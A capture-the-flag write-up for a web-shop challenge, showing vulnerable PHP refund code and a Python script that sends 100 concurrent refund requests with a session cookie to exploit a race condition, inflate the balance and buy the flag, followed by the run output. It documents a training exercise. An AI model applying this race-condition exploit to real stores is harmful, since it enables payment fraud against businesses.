**Author: Zukane**

*We always aim to make things bigger and better! Our shop now boasts more items than ever before and has scaled up to support way more users than previous years with a blazingly fast frontend!*

##### Challenge overview

In this web challenge, we are given the website's source code and a URL to connect to.

On the site, we can register a user and login. We are met with a web-shop where we can buy sick stuff, such as the EPT Fan or a new laptop. Unfortunately, we only have a balance of $100.00. The only item in the store we can afford is the Race Car costing $99.99. We can buy an item, and we can refund it if we have changed our mind. 

Based on the item's name being `Race Car`, and the fact that we can manipulate our balance, I was inclined to believe that this is a race-condition challenge where we have to inflate our balance.

Analysing the source code, we can see where the refund request is handled:

```php
if (isset($user_items[$item_id]) && $user_items[$item_id] > 0) {
	if (updateUserbalance($user['id'], $item['price'])) {
		if (removeUserItem($user['id'], $item_id)) {
			$messages[] = [
				"category" => "success",
				"message" => "Item refunded successfully!"
			];
			$user = getCurrentUser();
			$user_items = getItemsByUserId($user['id']);
		} else {
			$messages[] = [
				"category" => "danger",
				"message" => "Error removing item from user inventory."
			];
			updateUserbalance($user['id'], -$item['price']);
		}
	} else {
		$messages[] = [
			"category" => "danger",
			"message" => "Error updating user balance."
		];
	}
```

The script checks if the user owns the item, then it updated the balance, and if successful, it will remove the item from the inventory. This means there is a window of opportunity where multiple requests can pass the if-check before the item is removed, inflating our balance. The script tries to update our balance again if the item removal fails, but it evidently does not work.

##### Solution

We can use our session token (taken from an intercepted burpsuite request) and a python script to send many requests on our behalf. The script below will buy and refund until we have a balance of at least 2500, then it will buy the flag and print the order description.

```python
import requests, threading, time
from bs4 import BeautifulSoup

url = 'https://munintrollet-ca16-shop-4.ept.gg'
headers = {"Cookie": "session_token=51234d225f609543cc73016ae801512f9b15bf7cb2b016393eea7541585e6cd2"}

import requests, threading, time
from bs4 import BeautifulSoup

def post_action(action, item_id="1"):
    data = {"item_id": item_id, "action": action}
    requests.post(url, headers=headers, data=data)

def get_balance():
    r = requests.get(url, headers=headers)
    soup = BeautifulSoup(r.text, 'html.parser')
    balance_text = soup.find('h5', class_='card-title mb-0').text.strip().replace('$', '').replace(',', '')
    return float(balance_text)

def get_flag():
    r = requests.get(url + "/orders", headers=headers)
    soup = BeautifulSoup(r.text, 'html.parser')
    for note in soup.find_all('td'):
        if 'EPT{' in note.text:
            print('Flag found:', note.text.strip())
            return

print("Buying 'Race Car' item...")
post_action("buy")
time.sleep(1)

while (balance := get_balance()) < 2500:
    print(f"Balance: ${balance:.2f}. Performing concurrent refunds...")
    threads = [threading.Thread(target=post_action, args=("refund",)) for _ in range(100)]
    for t in threads: t.start()
    for t in threads: t.join()
    if balance < 2500:
        post_action("buy")
        time.sleep(1)

print("Balance reached $2500. Buying 'EPT Fan' item...")
post_action("buy", item_id="2")
time.sleep(1)

print("Retrieving the flag...")
get_flag()
```

Running the script gives us the flag:

```
└─$ python3 solve.py
Buying 'Race Car' item...
Balance: $0.01. Performing concurrent refunds...
Balance: $299.98. Performing concurrent refunds...
Balance: $599.95. Performing concurrent refunds...
Balance: $699.94. Performing concurrent refunds...
Balance: $899.92. Performing concurrent refunds...
Balance: $1999.81. Performing concurrent refunds...
Balance: $2299.78. Performing concurrent refunds...
Balance: $2499.76. Performing concurrent refunds...
Balance reached $2500. Buying 'EPT Fan' item...
Retrieving the flag...
Flag found: Come over to the admin booth and claim your very own EPT Fan for you and your team! EPT{th0s3_f4ns_g0_brrrr}
```

`EPT{th0s3_f4ns_g0_brrrr}`